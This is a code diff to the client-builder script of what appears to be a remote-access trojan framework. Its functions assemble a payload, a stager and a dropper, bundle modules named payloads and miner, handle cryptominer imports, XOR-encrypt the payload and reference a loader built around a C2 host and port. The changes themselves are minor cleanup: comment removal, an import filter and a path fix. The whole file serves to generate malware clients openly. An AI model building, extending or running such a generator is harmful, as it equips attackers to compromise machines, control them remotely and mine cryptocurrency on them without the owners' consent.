@@ -223,19 +223,13 @@ def main(*args, **kwargs):
 
 def _update(input, output, task=None):
     diff = round(float(100.0 * float(float(len(output))/float(len(input)) - 1.0)))
-    #util.display("({:,} bytes {} to {:,} bytes ({}% {})".format(len(input), 'increased' if len(output) > len(input) else 'reduced', len(output), diff, 'larger' if len(output) > len(input) else 'smaller').ljust(80), style='dim', color='reset')
-
 
 def _modules(options, **kwargs):
-    #util.display("\n[>]", color='green', style='bright', end=' ')
-    #util.display('Modules', color='reset', style='bright')
-    #util.display("\tAdding modules... ", color='reset', style='normal', end=' ')
-
     global __load__
     __load__ = threading.Event()
     __spin__ = _spinner(__load__)
 
-    modules = ['core/util.py','core/security.py','core/payloads.py', 'core/miner.py']
+    modules = ['modules/util.py','core/security.py','core/payloads.py', 'core/miner.py']
 
     if len(options.modules):
         for m in options.modules:
@@ -250,19 +244,12 @@ def _modules(options, **kwargs):
                 module = os.path.join(os.path.abspath('modules'), m if '.py' in os.path.splitext(m)[1] else '.'.join([os.path.splitext(m)[0], '.py']))
                 modules.append(module)
     __load__.set()
-    #util.display("({} modules added to client)".format(len(modules)), color='reset', style='dim')
     return modules
 
 
 def _imports(options, **kwargs):
-    #util.display("\n[>]", color='green', style='bright', end=' ')
-    #util.display("Imports", color='reset', style='bright')
-
-    assert 'modules' in kwargs, "missing keyword argument 'modules'"
-
-    #util.display("\tAdding imports...", color='reset', style='normal', end=' ')
-
     global __load__
+    assert 'modules' in kwargs, "missing keyword argument 'modules'"
     globals()['__load__'] = threading.Event()
     globals()['__spin__'] = _spinner(__load__)
 
@@ -279,6 +266,9 @@ def _imports(options, **kwargs):
                         imports.add(line.strip())
 
     imports = list(imports)
+    for bad_import in ['ctypes','colorama']:
+        if bad_import in imports:
+            imports.remove(bad_import)
     if sys.platform != 'win32':
         for item in imports:
             if 'win32' in item or '_winreg' in item:
@@ -302,22 +292,22 @@ def _hidden(options, **kwargs):
                 i = line.split()[1] if i == '*' else i
                 hidden.add(i)
 
+    for bad_import in ['ctypes','colorama']:
+        if bad_import in hidden:
+            hidden.remove(bad_import)
+
     globals()['__load__'].set()
-    #util.display("({} imports from {} modules)".format(len(list(hidden)), len(kwargs['modules'])), color='reset', style='dim')
     return list(hidden)
 
 
 def _payload(options, **kwargs):
-    #util.display("\n[>]", color='green', style='bright', end=' ')
-    #util.display("Payload", color='reset', style='bright')
-
     assert 'var' in kwargs, "missing keyword argument 'var'"
     assert 'modules' in kwargs, "missing keyword argument 'modules'"
     assert 'imports' in kwargs, "missing keyword argument 'imports'"
 
     loader  = open('core/loader.py','r').read()#, generators.loader(host=C2_HOST, port=int(C2_PORT)+2, packages=list(kwargs['hidden']))))
 
-    test_imports = '\n'.join(['import ' + i for i in list(kwargs['hidden']) if i not in ['StringIO','_winreg','pycryptonight','pyrx']])
+    test_imports = '\n'.join(['import ' + i for i in list(kwargs['hidden']) if i not in ['StringIO','_winreg','pycryptonight','pyrx','ctypes']])
     potential_imports = '''
 try:
     import pycryptonight
@@ -345,7 +335,6 @@ except ImportError: pass
 
     if options.encrypt:
         assert 'key' in kwargs, "missing keyword argument 'key' required for option 'encrypt'"
-        #util.display("\tEncrypting payload... ".format(kwargs['key']), color='reset', style='normal', end=' ')
         __load__ = threading.Event()
         __spin__ = _spinner(__load__)
         output = security.encrypt_xor(payload, base64.b64decode(kwargs['key']))
@@ -383,9 +372,6 @@ except ImportError: pass
 
 
 def _stager(options, **kwargs):
-    #util.display("\n[>]", color='green', style='bright', end=' ')
-    #util.display("Stager", color='reset', style='bright')
-
     assert 'url' in kwargs, "missing keyword argument 'url'"
     assert 'key' in kwargs, "missing keyword argument 'key'"
     assert 'var' in kwargs, "missing keyword argument 'var'"
@@ -410,7 +396,6 @@ def _stager(options, **kwargs):
         _update(stager, output, task='Compression')
         stager = output
 
-    #util.display("\tUploading stager... ", color='reset', style='normal', end=' ')
     __load__ = threading.Event()
     __spin__ = _spinner(__load__)
 
@@ -434,14 +419,10 @@ def _stager(options, **kwargs):
         url = urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
 
     __load__.set()
-    #util.display("(hosting stager at: {})".format(url), color='reset', style='dim')
     return url
 
 
 def _dropper(options, **kwargs):
-    #util.display("\n[>]", color='green', style='bright', end=' ')
-    #util.display("Dropper", color='reset', style='bright')
-    #util.display('\tWriting dropper... ', color='reset', style='normal', end=' ')
 
     assert 'url' in kwargs, "missing keyword argument 'url'"
     assert 'var' in kwargs, "missing keyword argument 'var'"
